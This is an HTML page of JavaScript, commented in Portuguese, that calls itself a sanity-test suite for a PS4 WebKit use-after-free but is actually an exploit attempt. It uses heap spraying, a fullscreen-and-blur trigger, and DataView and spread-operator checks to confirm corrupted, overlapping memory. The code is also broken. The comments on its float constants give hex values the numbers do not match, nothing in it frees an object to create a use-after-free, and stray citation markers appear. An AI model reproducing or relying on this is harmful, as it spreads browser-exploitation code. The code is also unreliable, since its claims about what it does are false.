<!DOCTYPE html>
<html>
<head>
    <title>PS4 UAF - Sanity Verification Suite</title>
    <style>
        body { background: #1a1a1a; color: #ccc; font-family: monospace; }
        .pass { color: #00ff00; font-weight: bold; }
        .fail { color: #ff0000; font-weight: bold; }
        .test-unit { border: 1px solid #444; padding: 10px; margin: 10px 0; }
    </style>
</head>
<body>
    <h1>PS4 WebKit UAF - Sanity Tests</h1>
    <button onclick="startSanityExploit()">INICIAR TESTES DE SANIDADE</button>
    <div id="log"></div>

    <script>
        function log(msg, className = "") {
            const div = document.getElementById('log');
            div.innerHTML += `<div class="${className}">${msg}</div>`;
        }

        function startSanityExploit() {
            log("Configurando controllers...");
            let controllers = [];
            const PATTERN_A = 2.121995791e-314; // 0x4141414141414141
            const UNIQUE_CHECK = 3.395193267e-313; // 0xDEADBEEFCAFEBABE

            for(let i = 0; i < 5000; i++) {
                let a = new Float64Array(8);
                a[0] = i;
                controllers.push(a);
            }

            log("Entrando em Fullscreen... Pressione OPTIONS agora.");
            if (document.documentElement.webkitRequestFullscreen) {
                document.documentElement.webkitRequestFullscreen();
            }

            window.onblur = function() {
                log("Evento Blur detectado. Executando Spray...");
                
                let spray = [];
                for(let i = 0; i < 8000; i++) {
                    let b = new Float64Array(8);
                    b.fill(PATTERN_A);
                    spray.push(b);
                }

                // Identificar o array corrompido
                let corrupted = null;
                let cIndex = -1;
                for(let i = 0; i < controllers.length; i++) {
                    if (controllers[i][0] === PATTERN_A) {
                        corrupted = controllers[i];
                        cIndex = i;
                        break;
                    }
                }

                if (!corrupted) {
                    log("UAF não gatilhado nesta tentativa.", "fail");
                    return;
                }

                log(`[!] UAF CONFIRMADO no Controller[${cIndex}]`, "pass");
                runSanitySuite(corrupted, spray, UNIQUE_CHECK);
            };
        }

        function runSanitySuite(corrupted, spray, magic) {
            log("<h3>INICIANDO SUÍTE DE SANIDADE</h3>");

            // TESTE 1: Verificação de Escrita Cruzada (Cross-Write)
            // Escrevemos no 'corrupted' e verificamos se algum array no 'spray' reflete isso.
            log("<div class='test-unit'>TESTE 1: Identidade de Memória Compartilhada");
            corrupted[4] = magic; 
            
            let foundInSpray = -1;
            for(let i = 0; i < spray.length; i++) {
                if (spray[i][4] === magic) {
                    foundInSpray = i;
                    break;
                }
            }

            if (foundInSpray !== -1) {
                log(`[PASS] Escrita no corrupted refletida no Spray[${foundInSpray}]`, "pass");
                log(`[REAL] Isso confirma que ambos apontam para o MESMO endereço físico.`);
            } else {
                log("[FAIL] O valor não foi encontrado no spray. Pode ser um falso positivo.", "fail");
            }
            log("</div>");

            // TESTE 2: Persistência de DataView
            // Usa o bypass confirmado via DataView [cite: 7]
            log("<div class='test-unit'>TESTE 2: Estabilidade via DataView");
            try {
                let view = new DataView(corrupted.buffer);
                view.setUint32(0, 0x13371337, true);
                
                if (corrupted[0] !== PATTERN_A) { // O valor mudou após o setUint32
                    log("[PASS] DataView escreveu com sucesso no buffer corrompido.", "pass");
                } else {
                    log("[FAIL] DataView não alterou o valor do Float64Array.", "fail");
                }
            } catch(e) {
                log("[ERROR] Falha ao acessar buffer: " + e.message, "fail");
            }
            log("</div>");

            // TESTE 3: Verificação de Integridade de Clonagem (Spread Bypass)
            // Usa o bypass via spread operator para validar a integridade dos dados [cite: 5, 10]
            log("<div class='test-unit'>TESTE 3: Verificação via Spread Operator");
            let clone = [...corrupted];
            if (clone[4] === magic) {
                log("[PASS] Clonagem via Spread manteve o valor corrompido.", "pass");
            } else {
                log("[FAIL] O clone não contém os dados corrompidos.", "fail");
            }
            log("</div>");
        }
    </script>
</body>
</html>
